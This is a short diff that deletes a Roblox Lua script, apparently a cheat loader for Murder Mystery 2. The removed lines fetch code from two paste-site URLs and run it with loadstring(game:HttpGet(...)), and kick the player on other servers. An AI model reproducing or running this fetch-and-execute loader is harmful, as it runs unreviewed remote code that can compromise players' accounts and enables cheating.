@@ -1,8 +1,1 @@
-if game.PlaceId == 142823291 then
-    task.spawn(function()
-        loadstring(game:HttpGet("https://www.ghostbin.cloud/5fcjz/raw", true))()
-    end)
-    loadstring(game:HttpGet("https://pastefy.app/8cqgvnbt/raw"))()
-else
-    game.Players.LocalPlayer:Kick("Game not supported. Please join a normal MM2 server")
-end
+
